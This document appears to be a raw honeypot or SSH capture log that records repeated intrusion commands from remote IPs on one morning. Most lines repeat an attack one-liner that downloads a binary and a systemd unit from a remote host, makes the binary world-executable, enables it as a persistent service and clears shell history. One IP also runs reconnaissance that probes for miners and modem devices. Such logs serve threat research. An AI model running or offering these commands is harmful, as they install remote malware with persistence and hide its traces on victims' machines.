start
2024-12-04 05:45:15.590845 - ('195.178.110.6', 44968) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:45:26.187247 - ('195.178.110.6', 52814) - apt
2024-12-04 05:45:30.676966 - ('195.178.110.6', 52814) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:45:38.946659 - ('195.178.110.6', 35756) - apt
2024-12-04 05:45:39.586884 - ('195.178.110.6', 35756) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:45:53.947854 - ('195.178.110.6', 39660) - apt
2024-12-04 05:45:54.746966 - ('195.178.110.6', 39660) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:46:11.449086 - ('195.178.110.6', 47556) - apt
2024-12-04 05:46:12.649862 - ('195.178.110.6', 47556) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:46:27.743442 - ('195.178.110.6', 54722) - apt
2024-12-04 05:46:29.166397 - ('195.178.110.6', 54722) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:46:29.641438 - ('61.41.151.37', 54443) - /ip cloud print
2024-12-04 05:46:30.893213 - ('61.41.151.37', 54443) - ifconfig
2024-12-04 05:46:31.918099 - ('61.41.151.37', 54443) - uname -a
2024-12-04 05:46:32.942017 - ('61.41.151.37', 54443) - cat /proc/cpuinfo
2024-12-04 05:46:33.966114 - ('61.41.151.37', 54443) - ps | grep '[Mm]iner'
2024-12-04 05:46:34.989974 - ('61.41.151.37', 54443) - ps -ef | grep '[Mm]iner'
2024-12-04 05:46:36.099346 - ('61.41.151.37', 54443) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 05:46:37.080570 - ('61.41.151.37', 54443) - echo Hi | cat -n
2024-12-04 05:46:42.999372 - ('195.178.110.6', 44732) - apt
2024-12-04 05:46:45.977587 - ('195.178.110.6', 44732) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:47:01.230023 - ('195.178.110.6', 44754) - apt
2024-12-04 05:47:04.041938 - ('195.178.110.6', 44754) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:47:15.534607 - ('195.178.110.6', 36844) - apt
2024-12-04 05:47:19.649640 - ('195.178.110.6', 36844) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:47:28.453781 - ('195.178.110.6', 53450) - apt
2024-12-04 05:47:29.952871 - ('195.178.110.6', 53450) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:47:44.241728 - ('195.178.110.6', 38744) - apt
2024-12-04 05:47:45.661183 - ('195.178.110.6', 38744) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:48:01.678547 - ('195.178.110.6', 36380) - apt
2024-12-04 05:48:03.249187 - ('195.178.110.6', 36380) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:48:18.500584 - ('195.178.110.6', 38900) - apt
2024-12-04 05:48:20.879585 - ('195.178.110.6', 38900) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:48:33.907403 - ('195.178.110.6', 41586) - apt
2024-12-04 05:48:37.853670 - ('195.178.110.6', 41586) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:48:46.568061 - ('195.178.110.6', 53642) - apt
2024-12-04 05:48:49.781189 - ('195.178.110.6', 53642) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:48:58.997607 - ('195.178.110.6', 56262) - apt
2024-12-04 05:48:59.745360 - ('195.178.110.6', 56262) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:49:16.273717 - ('195.178.110.6', 41824) - apt
2024-12-04 05:49:17.255727 - ('195.178.110.6', 41824) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:49:33.343197 - ('195.178.110.6', 35626) - apt
2024-12-04 05:49:34.544979 - ('195.178.110.6', 35626) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:49:51.643989 - ('195.178.110.6', 40308) - apt
2024-12-04 05:49:52.745739 - ('195.178.110.6', 40308) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:50:04.041335 - ('195.178.110.6', 43860) - apt
2024-12-04 05:50:06.446816 - ('195.178.110.6', 43860) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:50:15.770807 - ('195.178.110.6', 48240) - apt
2024-12-04 05:50:16.853211 - ('195.178.110.6', 48240) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:50:29.651373 - ('195.178.110.6', 49392) - apt
2024-12-04 05:50:30.751438 - ('195.178.110.6', 49392) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:50:44.946196 - ('195.178.110.6', 38746) - apt
2024-12-04 05:50:46.841321 - ('195.178.110.6', 38746) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:51:00.441838 - ('195.178.110.6', 48210) - apt
2024-12-04 05:51:03.140830 - ('195.178.110.6', 48210) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:51:18.347606 - ('195.178.110.6', 53456) - apt
2024-12-04 05:51:22.144995 - ('195.178.110.6', 53456) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:51:34.300343 - ('195.178.110.6', 35912) - apt
2024-12-04 05:51:38.244880 - ('195.178.110.6', 35912) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:51:49.543553 - ('195.178.110.6', 43960) - apt
2024-12-04 05:51:51.905452 - ('195.178.110.6', 43960) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:52:04.343634 - ('195.178.110.6', 54886) - apt
2024-12-04 05:52:05.046329 - ('195.178.110.6', 54886) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:52:18.875265 - ('195.178.110.6', 33686) - apt
2024-12-04 05:52:20.351589 - ('195.178.110.6', 33686) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:52:33.297442 - ('195.178.110.6', 48426) - apt
2024-12-04 05:52:36.743497 - ('195.178.110.6', 48426) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:52:45.554242 - ('195.178.110.6', 33584) - apt
2024-12-04 05:52:47.745078 - ('195.178.110.6', 33584) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:52:59.184291 - ('195.178.110.6', 41148) - apt
2024-12-04 05:52:59.943730 - ('195.178.110.6', 41148) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:53:13.147390 - ('195.178.110.6', 56770) - apt
2024-12-04 05:53:14.254331 - ('195.178.110.6', 56770) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:53:26.945407 - ('195.178.110.6', 52098) - apt
2024-12-04 05:53:29.541342 - ('195.178.110.6', 52098) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:53:42.266923 - ('195.178.110.6', 42858) - apt
2024-12-04 05:53:45.147843 - ('195.178.110.6', 42858) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-04 05:53:53.741471 - ('195.178.110.6', 47240) - apt
2024-12-04 05:53:55.757817 - ('195.178.110.6', 47240) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
